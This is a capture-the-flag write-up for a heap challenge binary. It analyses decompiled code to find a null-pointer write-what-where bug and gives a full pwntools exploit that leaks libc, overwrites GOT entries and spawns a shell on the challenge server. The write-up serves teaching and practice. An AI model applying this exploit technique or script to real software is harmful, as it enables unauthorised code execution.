## Summary

IMHO, the simplest [portable] way to pwn this was to use a null-pointer + offset to _write-what-where_ the GOT.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

All of the pointers to the heap are in global arrays; the _no-PIE_ will be helpful for that; same goes for the GOT as well (Partial RELRO = GOT vulnerable to overwrite).

### Decompile with Ghidra

> All naming done by hand, there was nothing for free here (except libc labels).

```c
      puts("name:");
      uVar2 = local_38;
      pvVar3 = malloc(0x20);
      *(void **)(&memory_name_ptr_00602260 + uVar2 * 8) = pvVar3;
      prompt_fgets(*(undefined8 *)(&memory_name_ptr_00602260 + local_38 * 8),0x10);
      lVar1 = *(long *)(&memory_name_ptr_00602260 + local_38 * 8);
      sVar4 = strcspn(*(char **)(&memory_name_ptr_00602260 + local_38 * 8),"\n");
      *(undefined *)(sVar4 + lVar1) = 0;
      puts("How long is your memory");
      prompt_lu(&local_48);
      local_30 = malloc(local_48);
      puts("Sometimes our memories fade and we only remember parts of them.");
      prompt_lu(&local_40);
      puts("Would you like to leave some space at the beginning in case you remember later?");
      if (local_48 < local_40) {
        puts("Invalid offset");
      }
      else {
        if (local_30 != (void *)0x0) {
          local_4c = 0;
          while ((ulong)(long)local_4c < local_40) {
            *(undefined *)((long)local_30 + (long)local_4c) = 0x5f;
            local_4c = local_4c + 1;
          }
        }
        local_30 = (void *)((long)local_30 + local_40);
        fflush(stdin);
        puts("What would you like to write");
        prompt_fgets(local_30,local_48 - local_40);
        puts("Would you say this memory is important to you? [Y/N]");
        prompt_fgets(local_24,2);
```

This section of the `create` function contains the _write-what-where_ that we'll use to setup a libc leak as well as overwrite the GOT for a shell.

The `local_30 = malloc(local_48);` statement with a sufficiently large input (`local_48`) will fail and end up as zero (null), with the only check for this an initialization section (`if (local_30 != (void *)0x0) {`).

The `prompt_lu(&local_40);` statement sets our offset and is then used to compute the target address with: `local_30 = (void *)((long)local_30 + local_40);`.  The only input validation is `local_48 < local_40`; the length of the initial length must be greater than the offset (both inputs are `unsigned long`).

With this, we can set the length (`local_48`) to `2**64 - 1`, and `malloc` will quietly fail setting `local_30` to `0`.  This ends up with `local_40` containing the target location to overwrite.  We have our _where_.

The _what_ is provided by: `prompt_fgets(local_30,local_48 - local_40);`.  `prompt_fgets` is just a frontend to `fgets`, however we need to leverage that `int param_2`:

```c
void prompt_fgets(char *param_1,int param_2)
{
  printf("> ");
  fgets(param_1,param_2,stdin);
  return;
}
```

The `local_48 - local_40` passed to `fgets` is problematic, if `local_48` is very large [to get `malloc` to return a null], and `local_40` is relatively small (a valid address, say in the GOT (`0x600000` range)), then the difference will be very large, `fgets` will call `malloc` and that `malloc` will fail as well.

To get a reasonable [small] input for `fgets` we need to find the right value of `local_48` reduced by `local_40` then _anded_ with `0xffffffff` (this is the `int param_2` from `prompt_fgets`; we are calling a function with an `unsigned long` as an input, however the function is expecting an `int` (32-bit), so we can assume only the lower 32-bits will be used).

```python
2**64 - (2**32 - target) + size)
```

You can work out the math yourself, but this will properly set `local_48` and `local_40` so that `malloc` nulls out, leaving our target address in `local_40` to satisfy the _where_ (`local_30 = (void *)((long)local_30 + local_40);`), and `local_48 - local_40` will just end up something like `0xffffffff0000000a` that when reduced to 32-bits by `prompt_fgets` will be a `size` of `0xa` in this example.

We have our _what_, now we just need a leak.

```c
      pvVar3 = malloc(0x20);
      *(void **)(&memory_name_ptr_00602260 + uVar2 * 8) = pvVar3;
      prompt_fgets(*(undefined8 *)(&memory_name_ptr_00602260 + local_38 * 8),0x10);
```

At the start of `create` we're prompted for a _name_ that is malloc'd and then the pointer stored in a global array based at `0x602260`.

To leak libc all we need to do is use our _write-what-where_ to change that pointer to point to some place in the GOT or BSS to pickup a libc leak.  The `list` function emits the names and therefore our leak.

> The libc version was provided in the form of a `Dockerfile`.  I've included it (`libc.so.6`) as part of this writeup since a future update to Ubuntu 18.04 may change the version of libc.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./just_another_heap')
binary.symbols['names'] = 0x602260

if args.REMOTE:
    p = remote('dctf-chall-just-another-heap.westeurope.azurecontainer.io', 7481)
    libc = ELF('./libc.so.6')
else:
    import signal
    p = process(('stdbuf -i0 -o0 -e0 '+binary.path).split(),preexec_fn=lambda: signal.signal(signal.SIGALRM, signal.SIG_IGN))
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
```

Standard pwntools setup, however I added the symbol `names`, and have my local process ignoring SIGALRM.

> No `setvbuf` in challenge binary, so I had to prepend `stdbuf`.

```python
p.sendlineafter('> ','1')
p.sendlineafter('> ','0')
p.sendlineafter('> ','blah')
p.sendlineafter('> ',str(2**64 - (2**32 - binary.sym.names) + 10))
p.sendlineafter('> ',str(binary.sym.names))
p.sendlineafter('> ',p64(binary.got.puts))
p.sendlineafter('> ','N')
p.sendlineafter('> ','N')
p.sendlineafter('> ','5')

p.recvuntil('0: ')
puts = u64(p.recv(6) + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))
```

Based on the analysis above this should be fairly clear.  Just add an entry, name it `blah`, but immediately overwrite its pointer with the location of GOT `puts`, then `list` (`5`) and capture the leak.

```python
p.sendlineafter('> ','1')
p.sendlineafter('> ','1')
p.sendlineafter('> ','blah')
p.sendlineafter('> ',str(2**64 - (2**32 - binary.got.strcspn) + 10))
p.sendlineafter('> ',str(binary.got.strcspn))
p.sendlineafter('> ',p64(libc.sym.system))
p.sendlineafter('> ','N')
p.sendlineafter('> ','N')
```

Same as the previous, but this time change `strcspn` to `system` in the GOT.

```python
p.sendlineafter('> ','1')
p.sendlineafter('> ','2')
p.sendlineafter('> ','/bin/sh')
p.interactive()
```

Finally, create a 3rd memory, but the `strcspn` that was used to replace the `\n` with `\0` is now `system`, so just ask for a shell as your _name_.
